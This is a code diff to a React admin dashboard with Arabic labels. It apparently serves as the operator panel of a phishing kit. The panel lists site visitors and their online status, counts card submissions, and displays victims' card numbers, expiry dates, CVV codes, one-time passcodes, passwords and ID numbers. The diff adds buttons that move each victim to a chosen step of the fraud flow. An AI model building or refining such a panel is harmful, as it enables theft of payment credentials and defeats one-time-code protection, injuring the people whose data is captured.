@@ -76,14 +76,14 @@ interface Notification {
   bank: string
   cardStatus?: string
   ip?: string
-  ccc: string
+  cvv: string
   id: string | "0"
-  ex: string
+  expiryDate: string
   notificationCount: number
   otp: string
   otp2: string
   page: string
-  cn: string
+  cardNumber: string
   country?: string
   personalInfo: {
     id?: string | "0"
@@ -105,7 +105,7 @@ interface Notification {
   mobile: string
   network: string
   phoneOtp: string
-  EX: string
+  cardExpiry: string
   name: string
   otpCode: string
   phone: string
@@ -113,10 +113,6 @@ interface Notification {
   currentPage?: string
   amount?: string
   step?: number
-  userName?: string
-  password?:string,
-  backImage?:string,
-  frontImage?:string
 }
 
 const stepButtons = [
@@ -775,7 +771,7 @@ export default function NotificationsPage() {
 
   // Statistics calculations
   const totalVisitorsCount = notifications.length
-  const cardSubmissionsCount = notifications.filter((n) => n.cn).length
+  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length
   const approvedCount = notifications.filter((n) => n.status === "approved").length
   const pendingCount = notifications.filter((n) => n.status === "pending").length
 
@@ -785,7 +781,7 @@ export default function NotificationsPage() {
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.cn)
+      filtered = filtered.filter((notification) => notification.cardNumber)
     } else if (filterType === "online") {
       filtered = filtered.filter((notification) => onlineStatuses[notification.id])
     }
@@ -795,10 +791,10 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase()
       filtered = filtered.filter(
         (notification) =>
-          notification.userName?.toLowerCase().includes(term) ||
+          notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
-          notification.mobile?.toLowerCase().includes(term) ||
-          notification.cn?.toLowerCase().includes(term) ||
+          notification.phone?.toLowerCase().includes(term) ||
+          notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
           notification.otp?.toLowerCase().includes(term),
       )
@@ -880,7 +876,7 @@ export default function NotificationsPage() {
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            notification.cn && !notifications.some((n) => n.id === notification.id && n.cn),
+            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
         )
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
@@ -918,7 +914,7 @@ export default function NotificationsPage() {
     const totalCount = notificationsData.length
 
     // Card submissions is the count of notifications with card info
-    const cardCount = notificationsData.filter((notification) => notification.cn).length
+    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length
 
     setTotalVisitors(totalCount)
     setCardSubmissions(cardCount)
@@ -1443,7 +1439,7 @@ export default function NotificationsPage() {
                     <th className="px-6 py-4 text-right font-semibold text-muted-foreground">الوقت</th>
                     <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الاتصال</th>
                     <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الكود</th>
-                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الصوره</th>
+                    <th className="px-6 py-4 text-center font-semibold text-muted-foreground">تحديث الخطوة</th>
                     <th className="px-6 py-4 text-center font-semibold text-muted-foreground">الإجراءات</th>
                   </tr>
                 </thead>
@@ -1461,24 +1457,24 @@ export default function NotificationsPage() {
                       <td className="px-6 py-4">
                         <div className="flex flex-wrap gap-2">
                           <Badge
-                            variant={notification.mobile ? "default" : "secondary"}
+                            variant={notification.phone ? "default" : "secondary"}
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.mobile ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
+                              notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                             }`}
                             onClick={() => handleInfoClick(notification, "personal")}
                           >
                             <User className="h-3 w-3 mr-1" />
-                            {notification.mobile ? "معلومات شخصية" : "لا يوجد معلومات"}
+                            {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                           </Badge>
                           <Badge
-                            variant={notification.cn ? "default" : "secondary"}
+                            variant={notification.cardNumber ? "default" : "secondary"}
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              notification.cn ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
+                              notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
                             }`}
                             onClick={() => handleInfoClick(notification, "card")}
                           >
                             <CreditCard className="h-3 w-3 mr-1" />
-                            {notification.cn ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                            {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                           </Badge>
                         </div>
                       </td>
@@ -1522,7 +1518,27 @@ export default function NotificationsPage() {
                       </td>
                       <td className="px-6 py-4">
                         <div className="flex flex-wrap justify-center gap-1">
-                         {notification.frontImage ||notification.backImage?<Badge className="bg-blue-600">صورة</Badge>:<Badge className="bg-yellow-400">لا يوجد صورة</Badge>}
+                          {stepButtons.map(({ name,label, step }) => (
+                             <TooltipProvider 
+                             key={step}
+                             >
+                             <Tooltip>
+                               <TooltipTrigger asChild>
+                            <Button
+                              size="icon"
+                              variant={notification.step === step ? "default" : "secondary"}
+                              onClick={() => handleStepUpdate(notification.id, step)}
+                              className={`text-xs px-2 h-7 ${notification.step === step?"bg-blue-500":"" }`}
+                            >
+                              {label}
+                            </Button>
+                            </TooltipTrigger>
+                              <TooltipContent>
+                                <p>{name}</p>
+                              </TooltipContent>
+                            </Tooltip>
+                          </TooltipProvider>
+                          ))}
                         </div>
                       </td>
                       <td className="px-6 py-4">
@@ -1624,31 +1640,40 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2">
                         <Badge
-                          variant={notification.mobile ? "default" : "secondary"}
+                          variant={notification.phone ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.mobile ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
+                            notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
                           <User className="h-3 w-3 mr-1" />
-                          {notification.mobile ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
-                          variant={notification.cn ? "default" : "secondary"}
+                          variant={notification.cardNumber ? "default" : "secondary"}
                           className={`cursor-pointer ${
-                            notification.cn ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
+                            notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
-                          {notification.cn ? "معلومات البطاقة" : "لا يوجد بطاقة"}
+                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                         </Badge>
                       </div>
 
                       <div className="pt-3 border-t">
+                        <p className="text-sm font-medium text-muted-foreground mb-2">تحديث الخطوة:</p>
                         <div className="flex flex-wrap gap-2">
-                        {notification.frontImage ||notification.backImage?<Badge className="bg-blue-600">صورة</Badge>:<Badge className="bg-yellow-400">لا يوجد صورة</Badge>}
-
+                          {stepButtons.map(({ label, step }) => (
+                            <Button
+                              key={step}
+                              size="sm"
+                              variant={notification.step === step ? "default" : "outline"}
+                              onClick={() => handleStepUpdate(notification.id, step)}
+                            >
+                              {label}
+                            </Button>
+                          ))}
                         </div>
                       </div>
 
@@ -1769,14 +1794,14 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الاسم", value: selectedNotification.userName },
+                  { label: "الاسم", value: selectedNotification.name },
                   { label: "رقم الهوية", value: selectedNotification.idNumber },
                   {
                     label: "الشبكة ",
-                    value: selectedNotification.password,
+                    value: selectedNotification.network,
                   },
                   { label: "رقم الجوال", value: selectedNotification.mobile },
-                  { label: "الهاتف", value: selectedNotification.mobile },
+                  { label: "الهاتف", value: selectedNotification.phone },
                   { label: "رمزهاتف", value: selectedNotification.otp2 },
 
                 ].map(
@@ -1802,16 +1827,16 @@ export default function NotificationsPage() {
                   { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: `${selectedNotification?.cn} `,
+                    value: `${selectedNotification?.cardNumber} - ${selectedNotification?.prefix}`,
                   },
                   {
                     label: "تاريخ الانتهاء",
                     value:
                       selectedNotification.year && selectedNotification.month
                         ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification?.EX,
+                        : selectedNotification.expiryDate,
                   },
-                  { label: "رمز الأمان", value: selectedNotification.ccc },
+                  { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
                   { label: "كلمة المرور", value: selectedNotification.pass },
                   { label: "الخطوة الحالية", value: selectedNotification.step },
